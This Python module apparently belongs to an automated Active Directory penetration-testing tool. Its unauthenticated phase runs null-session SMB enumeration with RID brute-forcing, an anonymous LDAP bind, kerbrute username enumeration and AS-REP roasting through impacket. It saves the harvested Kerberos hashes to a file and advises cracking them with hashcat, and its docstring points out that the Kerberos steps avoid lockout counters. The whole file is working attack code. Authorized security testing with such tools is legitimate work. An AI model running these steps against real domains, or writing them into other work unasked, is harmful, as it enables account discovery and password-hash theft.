"""Unauthenticated enumeration: null SMB, RID cycling, anonymous LDAP,
Kerberos user enum, AS-REP roast. None of this needs valid creds and the
Kerberos steps don't increment badPwdCount."""
from __future__ import annotations

from pathlib import Path

from ..core.config import Config
from ..core.log import get_logger
from ..core.models import ADUser, Domain, Finding, Phase, Severity, Share
from ..core.runner import Runner
from ..core.state import State
from . import parsers

log = get_logger(__name__)


def run(cfg: Config, state: State, runner: Runner) -> None:
    dcs = state.dcs()
    if not dcs:
        log.warning("no DC identified yet; run discovery first")
        return
    dc = cfg.dc_ip or dcs[0].ip
    smb_hosts = [h.ip for h in state.hosts() if 445 in h.ports]

    _smb_null(cfg, state, runner, smb_hosts)
    _ldap_anon(cfg, state, runner, dc)
    _kerbrute(cfg, state, runner, dc)
    _asrep(cfg, state, runner, dc)


def _smb_null(cfg, state, runner, smb_hosts) -> None:
    if not (smb_hosts and runner.have("nxc")):
        return
    dom = cfg.domain or ""
    for host in smb_hosts:
        log.info("null/guest SMB enumeration on %s", host)
        res = runner.run(
            f"nxc smb {host} -u '' -p '' --shares --users --rid-brute",
            label=f"smb_null_{host}",
        )
        if not res.stdout:
            continue

        for pu in parsers.parse_nxc_users(res.stdout):
            state.upsert_user(ADUser(username=pu.username, domain=dom,
                                     description=pu.description))
        rid_users, netbios = parsers.parse_nxc_rid_brute(res.stdout)
        if netbios:
            state.upsert_domain(Domain(name=netbios, dc_hosts=[host]))
        for pu in rid_users:
            state.upsert_user(ADUser(username=pu.username,
                                     domain=netbios or dom, rid=pu.rid))
        for ps in parsers.parse_nxc_shares(res.stdout):
            state.upsert_share(Share(host=host, name=ps.name,
                                     readable=ps.readable, writable=ps.writable,
                                     comment=ps.comment))

        if rid_users or "[+]" in res.stdout:
            state.add_finding(Finding(
                category="smb", title=f"Anonymous SMB enumeration: {host}",
                detail=f"Recovered {len(rid_users)} account(s) via null session.",
                severity=Severity.MEDIUM, source_module="unauth",
                evidence=str(res.logfile),
                mindmap_node="Unauth > SMB > Null/Guest session",
                phase=Phase.UNAUTH,
            ))


def _ldap_anon(cfg, state, runner, dc) -> None:
    if not runner.have("ldapsearch"):
        return
    log.info("anonymous LDAP bind attempt")
    res = runner.run(f"ldapsearch -x -H ldap://{dc} -s base namingContexts",
                     label="ldap_anon")
    if "namingContexts" in res.stdout:
        state.add_finding(Finding(
            category="ldap", title="Anonymous LDAP bind allowed",
            detail="Anonymous bind returned naming contexts; follow up with a "
                   "full '(objectClass=user)' query for descriptions.",
            severity=Severity.MEDIUM, source_module="unauth",
            evidence=str(res.logfile),
            mindmap_node="Unauth > LDAP > Anonymous bind", phase=Phase.UNAUTH,
        ))


def _kerbrute(cfg, state, runner, dc) -> None:
    if not (cfg.domain and runner.have("kerbrute")):
        return
    wordlist = "users.txt"
    if not Path(wordlist).exists():
        log.info("kerbrute: no %s wordlist present, skipping", wordlist)
        return
    log.info("kerberos user enumeration via %s", wordlist)
    res = runner.run(f"kerbrute userenum -d {cfg.domain} --dc {dc} {wordlist}",
                     label="kerbrute")
    valid = parsers.parse_kerbrute_userenum(res.stdout)
    for name in valid:
        state.upsert_user(ADUser(username=name, domain=cfg.domain))
    if valid:
        state.add_finding(Finding(
            category="kerberos", title=f"{len(valid)} valid username(s) via Kerberos",
            detail="Enumerated with kerbrute (no lockout).",
            severity=Severity.LOW, source_module="unauth",
            evidence=str(res.logfile),
            mindmap_node="Unauth > Kerberos > User enumeration",
            phase=Phase.UNAUTH,
        ))


def _asrep(cfg, state, runner, dc) -> None:
    known = [u.username for u in state.users()]
    if not (cfg.domain and known and runner.have("impacket-GetNPUsers")):
        return
    userfile = Path("users_known.txt")
    userfile.write_text("\n".join(known) + "\n", encoding="utf-8")
    log.info("AS-REP roast check on %d known users", len(known))
    res = runner.run(
        f"impacket-GetNPUsers {cfg.domain}/ -dc-ip {dc} -usersfile {userfile} "
        "-no-pass -format hashcat", label="asrep",
    )
    hashes = parsers.parse_asrep_hashes(res.stdout)
    if hashes:
        Path("asrep.hashes").write_text(
            "\n".join(h.hash for h in hashes) + "\n", encoding="utf-8")
        for h in hashes:
            state.upsert_user(ADUser(username=h.username, domain=cfg.domain,
                                     dont_require_preauth=True))
        state.add_finding(Finding(
            category="kerberos",
            title=f"{len(hashes)} AS-REP roastable account(s)",
            detail="Hashes saved to asrep.hashes; crack with hashcat -m 18200.",
            severity=Severity.HIGH, source_module="unauth",
            evidence=str(res.logfile),
            mindmap_node="Unauth > Kerberos > AS-REP Roasting", phase=Phase.UNAUTH,
        ))
